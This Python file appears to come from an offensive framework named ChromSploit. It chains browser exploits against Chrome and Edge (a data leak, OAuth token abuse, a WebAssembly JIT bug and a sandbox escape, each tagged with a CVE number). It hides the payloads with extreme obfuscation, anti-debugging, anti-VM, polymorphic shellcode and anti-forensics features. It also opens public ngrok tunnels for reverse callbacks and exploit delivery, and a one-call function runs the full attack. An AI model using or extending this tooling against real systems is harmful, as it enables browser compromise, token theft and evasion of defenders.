#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework - Enhanced Browser Multi-Exploit Chain
With integrated obfuscation and auto-ngrok support
"""

import time
import json
import base64
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
import logging

# ChromSploit imports
try:
    from core.enhanced_logger import get_logger
    from core.color_utils import Colors
    from core.exploit_chain import ExploitChain, ExploitStep, get_chain_manager
    from modules.obfuscation.payload_obfuscator import PayloadObfuscator
    from modules.obfuscation.obfuscator import ObfuscationLevel, get_obfuscator
    from core.ngrok_manager import NgrokManager
    logger = get_logger()
except ImportError:
    logger = logging.getLogger(__name__)


class EnhancedExploitChain(ExploitChain):
    """Enhanced exploit chain with obfuscation and ngrok support"""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.payload_obfuscator = None
        self.ngrok_manager = None
        self.obfuscation_stats = {
            'total_payloads': 0,
            'obfuscated_payloads': 0,
            'obfuscation_time': 0,
            'size_increase': 0
        }
    
    def _execute_exploit(self, cve_id: str, parameters: Dict[str, Any]) -> Tuple[bool, Any]:
        """Execute exploit with obfuscation support"""
        
        # Check for obfuscation
        if parameters.get('obfuscation_enabled') and parameters.get('payload_obfuscator'):
            self.payload_obfuscator = parameters['payload_obfuscator']
        
        # Pre-process payloads for obfuscation
        if self.payload_obfuscator:
            parameters = self._obfuscate_exploit_parameters(cve_id, parameters)
        
        # Call parent execution
        return super()._execute_exploit(cve_id, parameters)
    
    def _obfuscate_exploit_parameters(self, cve_id: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Obfuscate exploit payloads before execution"""
        
        obfuscated_params = parameters.copy()
        obfuscation_start = time.time()
        
        try:
            # Determine obfuscation level
            level = ObfuscationLevel[parameters.get('obfuscation_level', 'EXTREME')]
            
            # CVE-specific obfuscation
            if cve_id == "CVE-2025-4664":  # Chrome Link Header
                if 'javascript_payload' in parameters:
                    result = self.payload_obfuscator.obfuscate_exploit_payload(
                        parameters['javascript_payload'],
                        exploit_type='javascript',
                        level=level
                    )
                    obfuscated_params['javascript_payload'] = result['obfuscated']
                    self._update_obfuscation_stats(result)
                    logger.info(f"[Obfuscation] CVE-2025-4664 payload obfuscated (ratio: {result['ratio']:.2f}x)")
            
            elif cve_id == "CVE-2025-2783":  # Chrome Mojo IPC
                if 'exploit_js' in parameters:
                    result = self.payload_obfuscator.obfuscate_exploit_payload(
                        parameters['exploit_js'],
                        exploit_type='javascript',
                        level=level
                    )
                    obfuscated_params['exploit_js'] = result['obfuscated']
                    self._update_obfuscation_stats(result)
                
                # Obfuscate binary data with encoding
                if 'mojo_pipe_data' in parameters and isinstance(parameters['mojo_pipe_data'], bytes):
                    # Apply binary obfuscation
                    obfuscated_data = self._obfuscate_binary_data(parameters['mojo_pipe_data'])
                    obfuscated_params['mojo_pipe_data'] = obfuscated_data
                    logger.info(f"[Obfuscation] CVE-2025-2783 binary data obfuscated")
            
            elif cve_id == "CVE-2025-30397":  # Edge WebAssembly
                if 'wasm_payload' in parameters:
                    result = self.payload_obfuscator.obfuscate_exploit_payload(
                        parameters['wasm_payload'],
                        exploit_type='wasm',
                        level=level
                    )
                    obfuscated_params['wasm_payload'] = result['obfuscated']
                    self._update_obfuscation_stats(result)
                
                # Obfuscate JavaScript loader
                if 'js_loader' in parameters:
                    result = self.payload_obfuscator.obfuscate_exploit_payload(
                        parameters['js_loader'],
                        exploit_type='javascript',
                        level=level
                    )
                    obfuscated_params['js_loader'] = result['obfuscated']
                    self._update_obfuscation_stats(result)
                    logger.info(f"[Obfuscation] CVE-2025-30397 WebAssembly payloads obfuscated")
            
            elif cve_id == "CVE-2025-2857":  # Chrome OAuth
                if 'oauth_payload' in parameters:
                    # Apply string obfuscation to OAuth tokens
                    obfuscator = get_obfuscator()
                    obfuscated_tokens = {}
                    
                    for key, value in parameters.get('oauth_tokens', {}).items():
                        obfuscated_tokens[obfuscator.obfuscate_string(key)] = obfuscator.obfuscate_string(value)
                    
                    obfuscated_params['oauth_tokens'] = obfuscated_tokens
                    logger.info(f"[Obfuscation] CVE-2025-2857 OAuth tokens obfuscated")
            
            # Generic payload obfuscation
            for key in ['payload', 'exploit_code', 'shellcode', 'javascript', 'html_payload']:
                if key in parameters and isinstance(parameters[key], str):
                    result = self.payload_obfuscator.obfuscate_exploit_payload(
                        parameters[key],
                        exploit_type='javascript' if 'java' in key else 'html',
                        level=level
                    )
                    obfuscated_params[key] = result['obfuscated']
                    self._update_obfuscation_stats(result)
            
        except Exception as e:
            logger.warning(f"[Obfuscation] Failed to obfuscate {cve_id}: {e}")
        
        finally:
            self.obfuscation_stats['obfuscation_time'] += time.time() - obfuscation_start
        
        return obfuscated_params
    
    def _obfuscate_binary_data(self, data: bytes) -> bytes:
        """Obfuscate binary data with XOR and compression"""
        
        # Generate random key
        key = bytes([i % 256 for i in range(len(data))])
        
        # XOR with key
        obfuscated = bytes(a ^ b for a, b in zip(data, key))
        
        # Compress
        import zlib
        compressed = zlib.compress(obfuscated)
        
        # Encode
        return base64.b64encode(compressed)
    
    def _update_obfuscation_stats(self, result: Dict[str, Any]):
        """Update obfuscation statistics"""
        self.obfuscation_stats['total_payloads'] += 1
        self.obfuscation_stats['obfuscated_payloads'] += 1
        self.obfuscation_stats['size_increase'] += result.get('ratio', 1.0) - 1.0


class EnhancedBrowserExploitChain:
    """Enhanced browser exploit chain with full obfuscation and ngrok integration"""
    
    def __init__(self):
        # Initialize managers
        self.chain_manager = get_chain_manager()
        self.payload_obfuscator = PayloadObfuscator()
        self.ngrok_manager = NgrokManager()
        self.obfuscator = get_obfuscator()
        
        # Configuration
        self.config = {
            'obfuscation_enabled': True,
            'obfuscation_level': ObfuscationLevel.EXTREME,
            'auto_ngrok_enabled': True,
            'ngrok_region': 'us',
            'string_obfuscation': True,
            'control_flow_obfuscation': True,
            'dead_code_injection': True,
            'variable_renaming': True,
            'function_wrapping': True,
            'anti_debugging': True,
            'anti_vm': True,
            'polymorphic_code': True
        }
        
        self.active_tunnels = {}
        self.obfuscation_report = {}
    
    def create_enhanced_browser_chain(self, target_config: Dict[str, Any]) -> str:
        """Create enhanced browser exploitation chain with all features"""
        
        logger.info(f"{Colors.CYAN}[Enhanced Chain]{Colors.END} Creating browser exploit chain with obfuscation & ngrok")
        
        # Create base chain
        chain = EnhancedExploitChain(
            "Enhanced Browser Multi-Exploit Chain",
            "Automated browser exploitation with obfuscation and tunneling"
        )
        
        # Setup ngrok tunnels first
        tunnels = self._setup_ngrok_tunnels(target_config)
        if tunnels:
            # Update config with ngrok URLs
            target_config.update(tunnels)
            logger.info(f"{Colors.GREEN}[Ngrok]{Colors.END} {len(tunnels)} tunnels created")
        
        # Configure obfuscation
        chain.set_global_parameter('obfuscation_enabled', True)
        chain.set_global_parameter('obfuscation_level', self.config['obfuscation_level'].name)
        chain.set_global_parameter('payload_obfuscator', self.payload_obfuscator)
        
        # Apply string obfuscation to all URLs and parameters
        if self.config['string_obfuscation']:
            target_config = self._obfuscate_config_strings(target_config)
        
        # Add browser exploits with enhanced parameters
        self._add_enhanced_exploit_steps(chain, target_config)
        
        # Store chain
        self.chain_manager.chains[chain.id] = chain
        
        logger.info(f"{Colors.GREEN}[Enhanced Chain]{Colors.END} Created with ID: {chain.id[:8]}...")
        return chain.id
    
    def _setup_ngrok_tunnels(self, config: Dict[str, Any]) -> Dict[str, Any]:
        """Setup ngrok tunnels for all required ports"""
        
        tunnels = {}
        
        try:
            # Main callback tunnel
            callback_port = config.get('callback_port', 4444)
            callback_tunnel = self.ngrok_manager.create_tunnel(
                port=callback_port,
                proto='tcp',
                name='browser_callback',
                region=self.config['ngrok_region']
            )
            
            if callback_tunnel:
                tunnels['ngrok_callback_url'] = callback_tunnel.public_url
                tunnels['callback_host'] = callback_tunnel.public_url.split('//')[1].split(':')[0]
                tunnels['callback_port'] = int(callback_tunnel.public_url.split(':')[-1])
                self.active_tunnels['callback'] = callback_tunnel
            
            # HTTP server tunnel for exploit delivery
            http_port = config.get('http_port', 8080)
            http_tunnel = self.ngrok_manager.create_tunnel(
                port=http_port,
                proto='http',
                name='browser_http',
                bind_tls='both'
            )
            
            if http_tunnel:
                tunnels['ngrok_http_url'] = http_tunnel.public_url
                tunnels['exploit_server_url'] = http_tunnel.public_url
                self.active_tunnels['http'] = http_tunnel
            
            # WebSocket tunnel for real-time communication
            ws_port = config.get('ws_port', 8081)
            ws_tunnel = self.ngrok_manager.create_tunnel(
                port=ws_port,
                proto='http',  # WebSocket uses HTTP tunnel
                name='browser_ws'
            )
            
            if ws_tunnel:
                tunnels['ngrok_ws_url'] = ws_tunnel.public_url.replace('http', 'ws')
                self.active_tunnels['websocket'] = ws_tunnel
            
        except Exception as e:
            logger.error(f"[Ngrok] Failed to create tunnels: {e}")
        
        return tunnels
    
    def _obfuscate_config_strings(self, config: Dict[str, Any]) -> Dict[str, Any]:
        """Apply string obfuscation to configuration"""
        
        obfuscated_config = {}
        
        for key, value in config.items():
            # Obfuscate string values
            if isinstance(value, str) and not key.startswith('ngrok_'):
                # Don't obfuscate ngrok URLs as they need to be accessible
                obfuscated_config[key] = self.obfuscator.obfuscate_string(value)
            else:
                obfuscated_config[key] = value
        
        return obfuscated_config
    
    def _add_enhanced_exploit_steps(self, chain: EnhancedExploitChain, config: Dict[str, Any]):
        """Add exploit steps with enhanced obfuscation parameters"""
        
        # Step 1: Chrome Reconnaissance with obfuscated payloads
        chain.add_step(
            cve_id='CVE-2025-4664',
            description='Chrome data leak with obfuscated JavaScript',
            parameters={
                **config,
                'obfuscation_enabled': True,
                'obfuscation_level': self.config['obfuscation_level'].name,
                'control_flow_obfuscation': self.config['control_flow_obfuscation'],
                'dead_code_injection': self.config['dead_code_injection'],
                'string_array_encoding': True,
                'string_array_threshold': 0.8,
                'anti_debugging': self.config['anti_debugging']
            },
            timeout=300
        )
        
        # Step 2: OAuth Exploitation with token obfuscation
        chain.add_step(
            cve_id='CVE-2025-2857',
            description='OAuth exploitation with obfuscated tokens',
            parameters={
                **config,
                'obfuscation_enabled': True,
                'token_obfuscation': True,
                'polymorphic_oauth': self.config['polymorphic_code'],
                'encrypted_storage': True
            },
            timeout=300
        )
        
        # Step 3: WebAssembly with obfuscated WASM modules
        chain.add_step(
            cve_id='CVE-2025-30397',
            description='Edge WebAssembly with obfuscated JIT payloads',
            parameters={
                **config,
                'obfuscation_enabled': True,
                'wasm_obfuscation': True,
                'jit_spray_obfuscation': True,
                'memory_layout_randomization': True,
                'anti_vm': self.config['anti_vm']
            },
            timeout=400
        )
        
        # Step 4: Sandbox Escape with maximum obfuscation
        chain.add_step(
            cve_id='CVE-2025-2783',
            description='Chrome sandbox escape with extreme obfuscation',
            parameters={
                **config,
                'obfuscation_enabled': True,
                'obfuscation_level': 'EXTREME',
                'binary_obfuscation': True,
                'shellcode_encryption': True,
                'polymorphic_shellcode': self.config['polymorphic_code'],
                'anti_forensics': True,
                'self_modifying_code': True
            },
            timeout=600
        )
    
    def execute_enhanced_chain(self, chain_id: str) -> Dict[str, Any]:
        """Execute enhanced chain and generate obfuscation report"""
        
        chain = self.chain_manager.chains.get(chain_id)
        if not chain:
            return {'success': False, 'error': 'Chain not found'}
        
        logger.info(f"{Colors.CYAN}[Enhanced Chain]{Colors.END} Starting execution with obfuscation & ngrok")
        
        # Execute chain
        result = chain.execute(async_execution=False)
        
        # Generate obfuscation report
        self.obfuscation_report = {
            'total_payloads_obfuscated': chain.obfuscation_stats['obfuscated_payloads'],
            'obfuscation_time': chain.obfuscation_stats['obfuscation_time'],
            'average_size_increase': chain.obfuscation_stats['size_increase'] / max(1, chain.obfuscation_stats['total_payloads']),
            'techniques_used': [
                'Control Flow Flattening',
                'String Array Encoding',
                'Dead Code Injection',
                'Variable Renaming',
                'Function Wrapping',
                'Binary Obfuscation',
                'Anti-Debugging',
                'Anti-VM Detection',
                'Polymorphic Code Generation'
            ]
        }
        
        # Add ngrok tunnel info
        tunnel_info = {}
        for name, tunnel in self.active_tunnels.items():
            tunnel_info[name] = tunnel.public_url
        
        return {
            'success': result.status.value == 'success',
            'chain_result': result,
            'obfuscation_report': self.obfuscation_report,
            'ngrok_tunnels': tunnel_info,
            'enhanced_features': {
                'obfuscation_enabled': True,
                'ngrok_enabled': True,
                'string_obfuscation': self.config['string_obfuscation'],
                'control_flow_obfuscation': self.config['control_flow_obfuscation'],
                'polymorphic_code': self.config['polymorphic_code']
            }
        }
    
    def cleanup(self):
        """Cleanup tunnels and resources"""
        
        # Close ngrok tunnels
        for tunnel_name, tunnel in self.active_tunnels.items():
            try:
                self.ngrok_manager.close_tunnel(tunnel.name)
                logger.info(f"[Ngrok] Closed tunnel: {tunnel_name}")
            except:
                pass
        
        self.active_tunnels.clear()


# Quick access function with all features enabled
def execute_enhanced_browser_attack(target_url: str = 'http://localhost:8080',
                                   callback_ip: str = None,
                                   callback_port: int = 4444) -> Dict[str, Any]:
    """Execute browser attack with full obfuscation and auto-ngrok"""
    
    enhanced_chain = EnhancedBrowserExploitChain()
    
    config = {
        'target_url': target_url,
        'callback_ip': callback_ip or '127.0.0.1',
        'callback_port': callback_port,
        'http_port': 8080,
        'ws_port': 8081
    }
    
    # Create and execute enhanced chain
    chain_id = enhanced_chain.create_enhanced_browser_chain(config)
    result = enhanced_chain.execute_enhanced_chain(chain_id)
    
    # Cleanup
    enhanced_chain.cleanup()
    
    return result